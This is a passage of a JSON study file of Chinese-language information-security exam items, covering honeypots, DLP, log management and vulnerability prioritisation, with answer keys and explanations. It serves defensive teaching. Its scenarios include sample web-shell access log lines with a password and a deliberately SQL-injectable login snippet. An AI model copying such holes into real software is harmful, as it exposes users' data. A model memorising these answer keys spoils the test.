     "stem": "企業採用 AWS 與 Azure 混合雲架構。經查發現多起因開發人員錯誤設定 S3 儲存桶權限導致資料外洩的事件。為持續監控並自動修正此類配置錯誤，下列何種解決方案最為適切？",
     "options": [
      "導入雲端安全態勢管理（CSPM）工具",
      "部署網頁應用程式防火牆（WAF）",
      "全面升級端點防護軟體（EPP）至最新版",
      "在雲端虛擬機安裝入侵防禦系統（IPS）"
     ],
     "answer": 0,
     "hint": "回想各類雲端與資安工具的功能，逐項判斷哪一個能持續監控並修正雲端配置錯誤。",
     "explanation": "答案 A。情境是開發人員錯誤設定 S3 儲存桶權限導致資料外洩，需要持續監控並自動修正這類配置錯誤。雲端安全態勢管理（CSPM）正是持續檢查雲端資源組態是否偏離安全基準，並可自動告警與修正的工具，適用於 AWS 與 Azure 的混合雲。B WAF 保護的是網頁應用程式免於應用層攻擊，不檢查雲端資源權限。C 端點防護（EPP）保護端點上的惡意程式。D 在雲端虛擬機安裝 IPS 偵測網路入侵行為，不處理儲存桶權限設定。",
     "source": "115-1 第14題"
    }
   ]
  },
  {
   "id": "1.2-26",
   "section": "1.2",
   "title": "欺騙技術與蜜罐",
   "examHits": 2,
   "examRefs": [
    "115-2 第24題",
    "114-1 第23題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "欺騙技術（Deception）是放出「假的、但看起來很像真的」東西（假文件、假帳戶、假主機、假網段）引誘攻擊者，一旦有人碰就是早期預警。誘餌依互動程度分：低互動只模擬少量協定與服務，成本低、容易大量部署；中互動能讓攻擊者登入並模擬真實服務的回應；高互動使用真實的作業系統、服務與應用程式，通常在沙箱中觀察攻擊者行為，逼真但成本高、風險也高。蜜網依與生產環境的關係分：整合式放在生產環境裡，攻擊者有機會利用位置竊聽網路流量；獨立式與任何生產系統都不連接，風險最低。看到「可完整偵測」「保證零日」這類成效保證要小心。",
   "keyPoints": [
    "看到「誘餌互動程度」→ 互動越高越逼真、越能觀察攻擊者，但成本與風險也越高；實體／完整作業系統誘餌成本高、難大規模擴展，低互動才是低成本、易擴展。",
    "看到「整合式蜜網」→ 放在生產環境，攻擊者可能利用其位置竊聽流量，風險較高。",
    "看到「獨立式蜜網」→ 不連接任何生產系統，風險相對低。",
    "看到「保證完整偵測新攻擊模式與零日」→ 誘餌只能偵測與它互動的行為，成效保證式的敘述通常是錯的。"
   ],
   "trap": "把互動程度與成本弄反（以為高互動、實體系統誘餌很便宜），或相信蜜網能「完整偵測」所有新攻擊與零日漏洞。",
   "quiz": [
    {
     "stem": "在網路安全欺騙（Deception）偵測技術中有多種誘餌（Decoys）類型和互動程度，關於這些偵測技術，下列哪些描述最為正確？",
     "options": [
      "實體/完整作業系統誘餌（Real/Full OS decoys）的成本較低，易於大規模擴展部署",
      "低互動誘餌（Low-interaction decoys）模擬少量的網路協定和服務，以欺騙攻擊者",
      "中互動誘餌（Medium-interaction decoys）能讓攻擊者登入，並模擬真實服務回應",
      "高互動誘餌（High-interaction decoys）涉及使用真實的作業系統、服務和應用程式，可在安全的沙箱環境中觀察攻擊者行為"
     ],
     "answer": [
      1,
      2,
      3
     ],
     "hint": "回想各種互動程度誘餌的特性（逼真度、成本、風險），逐項判斷每句是否成立。",
     "explanation": "答案 B、C、D。這是複選題，問誘餌（Decoys）類型與互動程度。B 低互動誘餌只模擬少量的網路協定和服務，用來欺騙攻擊者，正確。C 中互動誘餌能讓攻擊者登入，並模擬真實服務的回應，正確。D 高互動誘餌使用真實的作業系統、服務與應用程式，可在安全的沙箱環境中觀察攻擊者行為，正確。A 說實體／完整作業系統誘餌成本較低、易於大規模擴展，剛好相反，完整作業系統誘餌成本高、部署與維護負擔大，不易大規模擴展，錯誤。",
     "source": "115-2 第24題"
    },
    {
     "stem": "如附圖所示。誘餌環境（Decoys Environment）常被稱為密罐（Honeypot），被拿來偵測、吸引與分析網路攻擊，用於欺騙並轉移攻擊者對關鍵系統的注意力，而達成提前預警回應的控制措施之一。關於誘餌環境相關敘述，下列何者「最不正確」？",
     "options": [
      "誘餌（Decoys）是一種仿真的數位人造物、物件或現象，旨在欺騙攻擊者的監控設備或誤導其評估。例如：假的 - 文件、帳戶、主機和網段…等",
      "整合式蜜網（Integrated Honeynet）於生產環境中設置誘餌以吸引攻擊者互動，但攻擊者有機會利用其位置進行網路流量竊聽",
      "連接式蜜網（Connected Honeynet）連接到生產環境的誘餌服務、系統或環境，模擬特定功能而不暴露系統完全存取權，可完整偵測新攻擊模式與識別零日漏洞攻擊",
      "獨立式蜜網（Standalone Honeynet）為吸引攻擊者並引出其行為而創建的環境，該環境不連接到任何生產系統，相較於整合式蜜網與連接式蜜網的風險更低"
     ],
     "answer": 2,
     "context": "（原題附圖為關係圖：Decoy Environment（誘餌環境）以 spoofs 連到 Local Area Network，以 spoofs 連到 Intranet Network，並以 manages 連到 Decoy Artifact。）",
     "hint": "回想各種蜜網的定義與限制，逐項判斷每句是否成立。",
     "explanation": "答案 C。題目問「最不正確」的敘述。C 說連接式蜜網「可完整偵測新攻擊模式與識別零日漏洞攻擊」，這是過度的成效保證：誘餌只能偵測與它互動的行為，無法保證完整偵測所有新攻擊或零日漏洞，所以本題官方認為 C 最不正確（官方未逐字說明理由）。A 誘餌是仿真的數位人造物、物件或現象，用來欺騙攻擊者的監控設備或誤導評估，例如假的文件、帳戶、主機、網段，正確。B 整合式蜜網在生產環境中設置誘餌，攻擊者有機會利用其位置竊聽網路流量，正確。D 獨立式蜜網不連接任何生產系統，風險比整合式與連接式更低，正確。",
     "source": "114-1 第23題"
    }
   ]
  },
  {
   "id": "1.2-27",
   "section": "1.2",
   "title": "DLP 與資料外洩防護",
   "examHits": 2,
   "examRefs": [
    "115-1 第13題",
    "114-1 第12題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "資料外洩防護（DLP）要解決的是：內部的資料被未經授權地送到外面，例如員工誤傳、內部人員帶走、惡意程式外傳。現代 DLP 的核心是看「資料本身」：依內容與情境（誰、在哪、傳給誰、什麼用途）對敏感資料分類、監控並攔截它的移動，不是只封某一種通道（USB、個人雲端），也不是只在偵測到惡意軟體時才啟動。把所有流量加密只能防竊聽，不能阻止內部把資料合法地送出去。NDR 看網路異常、CDN 是內容分發加速、IDS 偵測入侵，都不是專門避免資料被傳出去的技術。法規（如 GDPR）要求保護個資，DLP 策略要能對應這種要求。",
   "keyPoints": [
    "看到「避免內部資料未經授權傳到外部」→ 選資料外洩防護（DLP），它依資料內容辨識並依政策攔截。",
    "看到「現代 DLP 的核心精神」→ 基於資料的內容與情境感知，對敏感資料的移動進行分類、監控與攔截；封死單一通道太僵化。",
    "看到「流量加密」→ 防的是被竊聽，不能阻止內部把資料送出去，不等於 DLP。",
    "看到「只在偵測到惡意軟體時才監控」→ 範圍太窄，漏掉誤傳與內部人員的外洩。"
   ],
   "trap": "把任何「資安技術」都當成能防外洩：NDR、IDS、CDN、全面加密各有用途，但都不是專門辨識並攔截內部資料外送的 DLP。",
   "quiz": [
    {
     "stem": "一家金融機構正依據最新的隱私法規（如GDPR）要求，設計其資料外洩防護（Data Loss Prevention, DLP）策略。下列何項原則最能體現現代DLP的核心精神？",
     "options": [
      "封鎖所有員工使用USB隨身碟與個人雲端儲存",
      "基於資料的內容與情境感知，對敏感資料的移動進行分類、監控與攔截",
      "對公司所有的網路流量進行加密，防止被竊聽",
      "僅在偵測到惡意軟體時，才啟動資料外洩的監控"
     ],
     "answer": 1,
     "hint": "回想現代 DLP 的定義，逐項判斷每項原則是否符合。",
     "explanation": "答案 B。現代 DLP 的核心精神是基於資料的內容與情境感知，對敏感資料的移動進行分類、監控與攔截，才能符合 GDPR 等隱私法規對個資保護的要求。A 封鎖所有員工使用 USB 隨身碟與個人雲端，只針對特定通道，太僵化，也無法涵蓋其他外洩途徑。C 對所有網路流量加密，防止被竊聽，但不能阻止內部把資料送出去。D 只在偵測到惡意軟體時才啟動監控，忽略誤傳與內部人員造成的外洩，範圍太窄。",
     "source": "115-1 第13題"
    },
    {
     "stem": "在規劃企業資安的縱深防禦過程中，需要使用各種不同的技術與產品來應對不同情境的資安議題，下列哪一種技術最適合用來避免「內部資料被未經授權地傳輸到外部」的情況？",
     "options": [
      "網路流量分析與回應（Network Detection and Response，NDR）",
      "內容傳遞網路（Content Delivery Network，CDN）",
      "入侵偵測系統（Intrusion Detection System，IDS）",
      "資料外洩防護（Data Loss Prevention，DLP）"
     ],
     "answer": 3,
     "hint": "逐項回想每種技術的主要功能，判斷哪一個最適合防止資料被未經授權傳出。",
     "explanation": "答案 D。要避免「內部資料被未經授權地傳輸到外部」，最適合的是資料外洩防護（DLP），它辨識資料內容並依政策監控與攔截外送行為。A NDR 分析網路流量，偵測與回應網路上的異常行為，不專門辨識資料內容。B CDN 是內容傳遞網路，用來加速內容分發與分流，與外洩防護無關。C IDS 偵測入侵行為，主要針對攻擊者入侵，不是辨識內部資料外送。",
     "source": "114-1 第12題"
    }
   ]
  },
  {
   "id": "2.1-01",
   "section": "2.1",
   "title": "日誌管理與稽核事件判讀",
   "examHits": 17,
   "examRefs": [
    "115-1 第21題",
    "113-2 第24題",
    "113-2 第25題",
    "113-2 第36題",
    "113-1 第23題",
    "113-1 第25題",
    "112-2 第19題",
    "112-2 第22題",
    "112-1 第31題",
    "111-1 第40題",
    "109-1 第16題",
    "109-1 第20題",
    "108-1 第21題",
    "108-1 第22題",
    "108-1 第23題",
    "108-1 第25題",
    "108-1 第27題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "日誌是事後鑑識與稽核的唯一時間線。實務上要解決兩件事：第一，日誌能不能被信任（集中、即時、不可被入侵者改掉）；第二，不同設備的時間對不對得上（否則無法重建攻擊順序）。例如網站主機被植入 Web shell 後，攻擊者拿到管理權限就能清掉本機日誌，所以要即時拋送到另一台專用主機並做完整性保護；防火牆、WAF、網站主機的時間若各走各的，事件順序就會錯亂，最划算的做法是由網域控制站對時到可信時間源，其他設備再向網域控制站對時。Windows 事件 ID 4625 是登入失敗，大量出現代表暴力破解或密碼噴灑；勒索軟體事件要從網路設備、主機事件與防毒告警一起找，門禁紀錄不屬於這條線。",
   "keyPoints": [
    "看到「日誌要能當證據、防止被改」→ 優先選『即時送到遠端專用主機＋簽章或雜湊鏈結』，只靠本機唯讀或定期離線備份都擋不住入侵者先改再備份。",
    "看到「各設備日誌時間對不上」→ 先建立單一可信的對時階層（可信時間源 → 網域控制站 → 其他設備），不要讓每台各指各的，也不要改成人工校時。",
    "Windows 安全性事件：4624 登入成功、4625 登入失敗、4740 帳戶鎖定；大量 4625 加上大量鎖定，指向暴力破解或密碼噴灑。",
    "勒索軟體事件找入侵痕跡 → 網路防護設備、主機作業系統事件、防毒告警；實體門禁紀錄與入侵路徑無直接關聯。",
    "日誌本身也是資產：不可寫在可公開存取的路徑（如網站公開目錄），時間格式要一致（如 ISO 8601），並記錄來源 IP。"
   ],
   "trap": "把『保存日誌』等同『日誌可信』：本機唯讀、備份到 USB、滿額覆蓋這些做法都解決不了入侵者竄改與留存期不足；另外也容易把 4625（失敗）與 4624（成功）、4740（鎖定）搞混。",
   "quiz": [
    {
     "stem": "依據《資通安全管理法》及鑑識需求，針對關鍵資產的日誌（Logs）管理策略，下列何項實作最能確保日誌的「不可否認性（Non-repudiation）」與完整性？",
     "options": [
      "將日誌儲存於本地端伺服器，並設定唯讀權限",
      "透過Syslog 將日誌即時拋送至遠端專用伺服器，並實施數位簽章或雜湊鏈結",
      "定期將日誌備份至USB硬碟，並由專人保管鎖入保險箱",
      "設定日誌檔案滿額後自動覆蓋舊資料，以節省儲存空間"
     ],
     "answer": 1,
     "hint": "假設攻擊者已取得該主機最高權限，逐項問：這種做法還能確保日誌的完整性與不可否認性嗎？",
     "explanation": "答案 B。要同時達到不可否認性與完整性，需要『離開被攻擊主機』與『可驗證是否被改』兩件事：日誌即時拋送到遠端專用伺服器，攻擊者就算控制了來源主機也改不到已送出的紀錄；再加上數位簽章或雜湊鏈結，後續任何竄改都能被偵測。A 本機唯讀只靠權限，取得管理者權限的入侵者仍可改；C 定期備份到 USB 有時間空窗，且備份內容本身沒有完整性驗證；D 滿額自動覆蓋會直接損失鑑識所需的歷史紀錄。",
     "source": "115-1 第21題"
    },
    {
     "stem": "情境如附圖所示，特別聘請你擔任資訊安全長一職，首要之務，你必須解決大量的 Log 時間不同步的問題，下列那一個方案能提供最佳成本效益？",
     "options": [
      "將主要網域控制站的 NTP 校時指向國家時間頻率實驗室，並將所有設備 NTP 校時指向主要網域控制站。",
      "停用硬體內鍵時鐘，更換可採用電波校時的設備",
      "將不同設備指向不同的 NTP 校時 IP 以分散流量",
      "將所有設備停用硬體時間，改以定期手動校時"
     ],
     "answer": 0,
     "context": "機房管理是安全營運中最為貼近實體安全的議題，在一次的實地查核中，發現有一網站伺服器主機上存有免殺（Anti Anti-Virus）Web shell，安裝於該主機的防毒軟體，並未即時的偵查到該惡意反向連接的 Web shell，資訊安全人員隨即啟動鑑識及調查，發現防火牆上的存取記錄中，每隔一周即有一次來自於外部的記錄，經過過濾 web shell 所在路徑，得到下面的幾個條列記錄，離現今已有半年以上：\nPost /bin_file/tmp/resver.php 200 13.137.38.56 admin 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 admin1 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 admin123 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 user 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 manager 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 root 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 13.137.38.56 sudo 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 jason 1q2w#E$R\n\n詳細追查該檔案的建立日期為半年前，修改時間為 1 個月前，但在追查相關記錄時發現，外部防火牆上的時間校時為防火牆原廠提供的 NTP（Network Time Protocol），網站應用程式防火牆、外部防火牆及網站主機均有時間誤差。\n\n因公司所有終端電腦及伺服器均加入網域，為有效控制資安事件，鑑識人員追查網域控制站的安全性事件，發現有一管理人員的帳號密碼透過該網站伺服器向網域控制站進行登入，在過去這三個月來，每周均有一次透過網站伺服器主機上的員工入口網站主機登入驗證通過。\n\n同時發現該帳號於網站主機上，安全性事件記錄中，有大量的 4625 事件編號產生，且於網站伺服器的安全性事件中發現在約 2 個月前，已有大量人員的網域帳號因帳號鎖定，需要管理人員解鎖事件發生。\n\n更於上周有員工存放於網路共享磁碟上置放的資料，副檔名變成 encrypt123，CEO 認為這已影響到公司營運。",
     "hint": "逐項比較：每個方案能否解決時間不同步？成本效益如何？",
     "explanation": "答案 A。情境中防火牆、WAF、網站主機的時間都有誤差，根因是各設備各自對時。最具成本效益的是建立對時階層：主要網域控制站向可信的國家時間頻率來源對時，其餘設備再向網域控制站對時（網域環境本來就依賴一致的時間，Kerberos 驗證對時間偏差有容忍上限）。B 更換為電波校時設備要大量汰換硬體，成本高；C 指向不同的校時來源反而製造更多不一致；D 停用硬體時鐘改人工校時，無法持續維持精準，且人力成本最高。",
     "source": "113-2 第24題"
    },
    {
     "stem": "情境如附圖所示，發現 Windows 作業系統建置的網站伺服器，該主機上的安全性事件中，查得大量的 4625 事件編號之事件，此事件編號所指的是下列何種事件？",
     "options": [
      "帳號登入成功",
      "帳號被鎖定",
      "帳號有異動",
      "帳號登入失敗"
     ],
     "answer": 3,
     "context": "機房管理是安全營運中最為貼近實體安全的議題，在一次的實地查核中，發現有一網站伺服器主機上存有免殺（Anti Anti-Virus）Web shell，安裝於該主機的防毒軟體，並未即時的偵查到該惡意反向連接的 Web shell，資訊安全人員隨即啟動鑑識及調查，發現防火牆上的存取記錄中，每隔一周即有一次來自於外部的記錄，經過過濾 web shell 所在路徑，得到下面的幾個條列記錄，離現今已有半年以上：\nPost /bin_file/tmp/resver.php 200 13.137.38.56 admin 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 admin1 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 admin123 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 user 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 141.10.213.4 manager 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 root 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 13.137.38.56 sudo 1q2w#E$R\nPost /bin_file/tmp/resver.php 200 112.54.117.233 jason 1q2w#E$R\n\n詳細追查該檔案的建立日期為半年前，修改時間為 1 個月前，但在追查相關記錄時發現，外部防火牆上的時間校時為防火牆原廠提供的 NTP（Network Time Protocol），網站應用程式防火牆、外部防火牆及網站主機均有時間誤差。\n\n因公司所有終端電腦及伺服器均加入網域，為有效控制資安事件，鑑識人員追查網域控制站的安全性事件，發現有一管理人員的帳號密碼透過該網站伺服器向網域控制站進行登入，在過去這三個月來，每周均有一次透過網站伺服器主機上的員工入口網站主機登入驗證通過。\n\n同時發現該帳號於網站主機上，安全性事件記錄中，有大量的 4625 事件編號產生，且於網站伺服器的安全性事件中發現在約 2 個月前，已有大量人員的網域帳號因帳號鎖定，需要管理人員解鎖事件發生。\n\n更於上周有員工存放於網路共享磁碟上置放的資料，副檔名變成 encrypt123，CEO 認為這已影響到公司營運。",
     "hint": "回想 Windows 安全性事件記錄中常見事件 ID 的意義。",
     "explanation": "答案 D。Windows 安全性事件 4625 是「帳戶登入失敗」（An account failed to log on）。對照情境：網站主機出現大量 4625，約兩個月前又有大量網域帳號被鎖定，符合暴力破解或密碼噴灑的跡象。A 登入成功是 4624；B 帳戶被鎖定是 4740；C 帳戶有異動是 4738（使用者帳戶已變更）等。",
     "source": "113-2 第25題"
    },
    {
     "stem": "情境如附圖所示。在你執行完安全檢測並提供相關建議後，開發團隊對程式進行弱點修補並強化了 logLoginAttempt 函數如圖 1，下列哪些描述正確？",
     "options": [
      "記錄 IP 位置有助於識別和追蹤嘗試惡意登入的來源",
      "使用 ISO 8601 的時間格式有利於分析，可紀錄一致且標準化的時間資訊",
      "日誌記錄於瀏覽器主控台或可公開存取檔案，為兼顧安全與可用性的實做方式",
      "此函數能夠協助系統管理者識別帳號枚舉攻擊與試圖暴力破解之行為"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "你正在協助產品開發單位，對即將上線的電子商務網站進行安全測試，並且於於測試過程中發現一份 JavaScript 原始碼片段（如下圖），請指出這份原始碼所可能含有的安全問題並提供適當修補建議。\n\n// Advanced eCommerce Website User Login JavaScript Code\nfunction authenticateUser(username, password) {\n    const query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\";\n}\n\nfunction logLoginAttempt(username, success) {\n    // Log login attempt, including username and success/failure\n}\n\napp.post('/login', function(req, res) {\n    let username = req.body.username;\n    let password = req.body.password;\n    let isAuthenticated = authenticateUser(username, password);\n\n    logLoginAttempt(username, isAuthenticated);\n    if (isAuthenticated) {\n        res.send('Login successful!');\n    } else {\n        res.send('Login failed!');\n    }\n});\n\nfunction verifyToken(token) {\n    // Verify the token's validity\n}\n\napp.post('/api/protected', function(req, res) {\n    let token = req.headers.authorization;\n    if (!verifyToken(token)) {\n        res.status(401).send('Unauthorized');\n        return;\n    }\n    // Protected API logic here\n});\n\n附圖 1\n// Extended logLoginAttempt function with secure implementations\nfunction logLoginAttempt(username, success, ipAddress) {\n    let timestamp = new Date().toISOString();\n    let logMessage = `Timestamp: ${timestamp}, Username: ${username}, Success: ${success}, IP: ${ipAddress}`;\n\n    // Code to log the message to a file or database\n    console.log(logMessage);\n    fs.writeFile('/public/logs/loginAttempts.txt', logMessage, { flag: 'a+' },\n    err => {\n        if (err) {\n            console.error('Logging error: ', err);\n        }\n    });\n\n    // Emailing log details\n    emailService.sendEmail('admin@example.com', 'Login Attempt Logged',\n    logMessage);\n\n    // Additional logic to analyze login attempts and detect anomalies\n    (potentially secure)\n    // ...\n}",
     "hint": "逐行讀懂附圖 1 的函數做了哪些事，再逐項判斷每句描述是否正確。",
     "explanation": "答案 A、B、D。A 記錄來源 IP 有助於追查、封鎖惡意來源；B toISOString() 產生 ISO 8601 的標準時間格式，利於跨系統彙整分析；D 日誌含時間、帳號、成功與否、IP，可以看出同一 IP 嘗試多個帳號（帳號枚舉）與短時間大量失敗（暴力破解）。C 錯誤：圖中日誌被寫到 /public/logs/ 這種可公開存取的路徑，並同時以 console.log 輸出（在 Node.js 伺服器端執行時會印到伺服器主控台與其日誌），任何人都可能讀到含帳號與 IP 的紀錄，是資訊洩漏，並非兼顧安全與可用性的實作。",
     "source": "113-2 第36題"
    },
    {
     "stem": "在勒索軟體事件中，下列哪些日誌的來源可能找到入侵的紀錄或警訊？",
     "options": [
      "網路面資安防護設備",
      "重要主機之作業系統事件",
      "防毒軟體告警",
      "門禁進出紀錄"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "hint": "逐項問：這個日誌來源能不能記錄到勒索軟體入侵的過程？",
     "explanation": "答案 A、B、C。勒索軟體入侵會在多個層面留下痕跡：A 網路面資安防護設備（防火牆、IPS、代理伺服器）可看到可疑連線與 C2；B 重要主機的作業系統事件（登入、服務建立、程序建立）；C 防毒軟體告警可能有早期偵測紀錄。D 門禁進出紀錄屬實體安全，勒索軟體是透過網路或端點入侵，一般不會在門禁紀錄中留下入侵證據。",
     "source": "113-1 第23題"
    }
   ]
  },
  {
   "id": "2.1-02",
   "section": "2.1",
   "title": "弱點掃描與修補優先順序",
   "examHits": 13,
   "examRefs": [
    "115-1 第23題",
    "114-1 第1題",
    "114-1 第17題",
    "114-1 第18題",
    "113-2 第7題",
    "113-1 第2題",
    "112-2 第13題",
    "112-2 第39題",
    "112-1 第5題",
    "112-1 第8題",
    "111-1 第8題",
    "111-1 第21題",
    "108-1 第14題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "弱點掃描一次掃出幾千個弱點是常態，資安團隊的人力、停機窗口都有限，所以重點不是『全部修』，而是『先修哪個』。優先順序要綜合三件事：資產是否對外暴露、弱點是否真的可被利用（有無公開 Exploit）、資產本身的重要性與停機影響；CVSS 分數只是輸入之一，不是唯一排序依據。遇到已停止維護（EOS）的設備或沒有官方修補程式的系統，不能放著不管，要先評估風險再採補償措施，例如隔離網段、限制存取、加強監控並規劃汰換。掃描工具也要分清楚：系統弱掃（如 Nessus）是掃主機與服務，原始碼靜態分析工具（如 Fortify）不是網站弱掃。修補後要複測確認。",
   "keyPoints": [
    "看到「弱點很多、人力有限」→ 先修『對外暴露且可被利用』的高風險弱點，再依資產重要性與可利用性排序，不是依數量或依好修程度。",
    "看到「全依 CVSS 高到低」或「一天全部修完」這類絕對說法 → 通常是錯的，要考慮暴露面、有無 Exploit、重開機與停機對服務的影響。",
    "看到「設備 EOS／沒有修補程式」→ 評估風險並採補償性控制（隔離、限制存取、監控、汰換計畫），不是不處理，也不是只改單向規則。",
    "看到弱點已有 CVE 與官方更新 → 修補是首選；暫時無法修補才用阻擋相關連接埠等緩解措施；『把所有主機換作業系統』是不切實際的選項。",
    "掃描流程完整性：系統弱掃 → 風險評估 → 修補 → 複測；Fortify 這類是靜態原始碼分析，不能拿來當網站（動態）弱點掃描。"
   ],
   "trap": "只看 CVSS 分數或只看弱點數量決定修補順序；以及把『沒有 patch』當成『不用處理』。另外，靜態原始碼分析工具常被誤當成網站弱點掃描工具。",
   "quiz": [
    {
     "stem": "資安團隊收到弱點掃描報告共 2,000 個弱點，其中包含：對外系統的高風險 RCE （Remote Code Execution）、內網測試機的重大風險弱點、以及多台使用者端的低風險資訊揭露。公司高層希望資安團隊說明弱點修補的優先順序，若以公司風險控管的角度來考量，資安團隊應該優先採取下列何項較為合適？",
     "options": [
      "先修數量最多的同一種弱點，因為最能降低弱點總量",
      "依CVSS（Common Vulnerability Scoring System）由高到低，全部照順序修補",
      "修補「對外暴露且可利用」的高風險弱點，再依資產重要性與可利用性排序",
      "先修使用者端的低風險資訊洩漏，因為最容易修補"
     ],
     "answer": 2,
     "hint": "從公司風險控管的角度，逐項判斷每種排序方式考量了哪些因素、是否足夠。",
     "explanation": "答案 C。風險導向的修補順序是：先處理『對外暴露且可被利用』的高風險弱點（對外 RCE 最危險），再依資產重要性與可利用性往下排。A 以數量最多的同類弱點優先，只降低總量、不一定降低風險；B 完全照 CVSS 由高到低，忽略暴露面與資產重要性，內網測試機的重大弱點未必比對外 RCE 急；D 先修最容易修的低風險資訊洩漏，是挑軟柿子，風險降低有限。",
     "source": "115-1 第23題"
    },
    {
     "stem": "目前有一個大企業，員工超過 5000 人、系統超過 500 個，想要定期對內部進行弱點掃描，請問在實務考量下（人力、資源、時間都有限），下列觀念何者較為正確？",
     "options": [
      "無論弱點的風險等級是重大、高、中、低，無論弱點數量有多少個，無論資訊部門的人力是否足夠，都應該在一天之內把所有弱點都修補完畢，才能確保企業是安全的",
      "只要掃描出來的弱點類型屬於 OWASP Top 10 其中之一，就應該立刻進行修補，不需要對弱點進行任何評估",
      "掃描結果出爐後，應先針對每個弱點的風險等級、實際影響程度、有無出現攻擊利用程式（Exploit）進行評估，同時也要考慮重開機或停機對企業服務的影響程度，最後再來規劃每個弱點的修補時程",
      "當某台伺服器的弱點掃描結果出現作業系統弱點時，如果該作業系統的官方網站沒有釋出任何修補更新檔（patch），維運人員就不需要對該伺服器做任何處置"
     ],
     "answer": 2,
     "hint": "考量人力、資源、時間有限，逐項判斷每句觀念是否實務可行。",
     "explanation": "答案 C。實務上掃描後要先評估：弱點的風險等級、實際影響、是否有公開 Exploit，並考量重開機或停機對服務的影響，再規劃修補時程。A 要求一天全部修完，不符合人力與營運現實；B 只要屬於 OWASP Top 10 就立刻修、不評估，忽略脈絡與優先順序；D 沒有官方修補程式不代表不用處置，仍需採補償措施（隔離、限制存取、監控等）。",
     "source": "114-1 第1題"
    },
    {
     "stem": "情境如附圖所示。該公司資安人員針對所有資訊資產進行了弱點掃描作業。試問有關該資安人員所實施的弱點掃描敘述，下列何者錯誤？",
     "options": [
      "使用 Fortify Static Code Analyzer 執行網站弱點掃描作業",
      "使用 Nessus Professional 執行系統弱點掃描作業",
      "將弱點掃描結果屬於中風險程度以上之弱點進行後續處理之評估",
      "依據弱點修補結果實施第二次的弱點掃描複測作業"
     ],
     "answer": 0,
     "context": "A 公司為一金融機構（資通安全責任等級 A 級），近期因為駭客攻擊事件頻仍，因此該公司資安長要求內部必須針對目前外在資安環境以及內部資訊資產的變化，重新檢視與評估潛在的風險並於以適切之處理，以確保該公司的資訊安全。",
     "hint": "逐項回想每個工具的類型與用途，判斷敘述中的用法是否正確。",
     "explanation": "答案 A（錯誤的敘述）。Fortify Static Code Analyzer 是靜態原始碼分析（SAST）工具，掃的是原始碼，不是對運行中網站做的弱點掃描；網站弱掃通常使用動態工具（如 Acunetix、Burp 等）。B Nessus Professional 用於系統弱點掃描，正確；C 將中風險以上的弱點納入後續處理評估，是常見的篩選做法；D 修補後再做複測以確認弱點已消除，是標準流程。",
     "source": "114-1 第17題"
    },
    {
     "stem": "情境如附圖所示。資安人員於風險評鑑過程中，發覺該公司有一部防火牆已遭原廠宣告終止服務（End of Service，EOS）。試問有關資安人員對於此一發現之後續作為，下列何者最為適切？",
     "options": [
      "立即變更防火牆設定，將外對內之封包進行阻擋",
      "立即變更防火牆設定，將內對外之封包進行阻擋",
      "立即將防火牆的設定檔（Config）進行備份",
      "立即評估該防火牆之風險並妥採適切之控制措施"
     ],
     "answer": 3,
     "context": "A 公司為一金融機構（資通安全責任等級 A 級），近期因為駭客攻擊事件頻仍，因此該公司資安長要求內部必須針對目前外在資安環境以及內部資訊資產的變化，重新檢視與評估潛在的風險並於以適切之處理，以確保該公司的資訊安全。",
     "hint": "回想風險管理的處理流程，逐項判斷每個作為是否適合作為發現 EOS 設備後的處置。",
     "explanation": "答案 D。防火牆已遭原廠宣告終止服務（EOS）代表不再有安全更新與支援，應立即評估該設備的風險，並採取適切的控制措施（例如加強存取控制與監控、限制暴露面、規劃汰換）。A、B 只是單向調整規則，治標且未評估整體風險，還可能影響營運；C 備份設定檔是好習慣，但並不處理 EOS 的風險。",
     "source": "114-1 第18題"
    },
    {
     "stem": "情境如附圖所示，工程師使用了弱點掃描軟體來針對公司內部系統進行掃描後，發現了弱點掃描軟體原生報告內指出公司的系統具有一個「CVE-2022-26809 Remote Procedure Call Runtime Remote Code Execution Vulnerability」嚴重風險程度的弱點，攻擊者可將特別製作之遠端程序呼叫（Remote Procedure Call，RPC）傳送至 RPC 主機，即可獲得與 RPC 服務相同之權限，進而於伺服器上遠端執行任意程式碼，該工程師為了處理這個弱點，因此採取了一些的措施來因應，試問採用下列哪些措施較為合適？",
     "options": [
      "連接 CVE 網站（https://cve.mitre.org/）檢視該弱點的詳細資訊",
      "連接微軟官網下載針對此弱點所發布之安全更新程式予以修補",
      "在防火牆上採取阻擋 TCP 埠 445 的緩解措施",
      "將所有主機系統變更為 Unix Base"
     ],
     "answer": [
      0,
      1,
      2
     ],
     "context": "公司因供應鏈之客戶要求在執行受託業務時，必須針對所承接之受託業務有關的資訊安全有所作為，因此公司高層下令有關人員針對公司在執行受託業務上可能面臨的資訊安全風險議題進行研議。",
     "hint": "逐項問：這項措施對處理這個 RPC 弱點是否合適、是否可行？",
     "explanation": "答案 A、B、C。CVE-2022-26809 是 RPC Runtime 的遠端程式碼執行弱點。A 連到 CVE 網站查看弱點詳細資訊，屬於蒐集情資，是合理的第一步；B 由廠商官網下載並安裝針對該弱點的安全更新，是根本的修補方式；C 在防火牆阻擋 TCP 445 屬於暫時性的緩解措施（縮小暴露面）。D 把所有主機改成 Unix Base 不切實際，也不是針對單一弱點的合理處置。",
     "source": "113-2 第7題"
    }
   ]
  },
  {
   "id": "2.1-03",
   "section": "2.1",
